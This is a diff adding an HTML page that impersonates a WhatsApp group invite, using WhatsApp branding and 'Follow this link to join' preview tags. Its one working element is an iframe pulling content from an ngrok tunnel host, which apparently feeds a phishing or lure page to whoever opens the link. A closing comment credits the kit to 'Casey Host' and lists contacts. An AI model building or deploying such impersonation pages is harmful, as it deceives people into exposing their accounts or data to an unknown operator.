@@ -1,0 +1,40 @@
+<html lang="en" class="version-d platform-desktop">
+<head>
+<meta charset="UTF-8">
+<title>WhatsApp</title>
+<meta property="og:title" content="WhatsApp Group Invite"/>
+<meta property="og:image" content="img/v4/icon.png"/>
+<meta property="og:site_name" content="WhatsApp.com"/>
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no"/>
+<meta http-equiv="X-UA-Compatible" content="IE=9">
+<meta name="theme-color" content="#1BA691">
+<meta name="msapplication-navbutton-color" content="#1BA691">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="#1BA691">
+<link id="favicon" rel="shortcut icon" href="img/v4/icon.png" type="image/png">
+
+<!--Follow this link to join-->
+<meta property="og:description" content="Follow this link to join"/>
+</head>
+<body class="page page--landing page--invite" id="top">
+
+	<div class="page-header__inner">
+	<table width="100%" height="100%"><tr><td colspan="3"><img src="img/v4/head.png" align="center" width="100%"></td></tr>
+	<tr><td align="left"><img src="img/v4/icon-st.png" width="90%" height="280px"></td><td align="left"><iframe style="border:#FFFFFF;" src="https://ba08-202-138-236-69.ngrok.io/" height="280px" width="280px"></iframe></td></tr>
+	<tr><td colspan="2"><img src="img/v4/lgsit.png" width="94%"></td></tr>
+	</table>
+	
+	
+		</div>
+</div>
+
+	</body>
+	</html>
+<!--- 
+SCRIPT 18+ BY CASEY HOST
+TANGGAL PEMBUATAN 13 SEPTEMBER 2021
+FACEBOOK : www.facebook.com/caseyhostt
+WHATSAPP : wa.me/+14508232332
+YOUTUBEE : CaseyHost
+TELEGRAM : t.me/CaseyHost
+--->
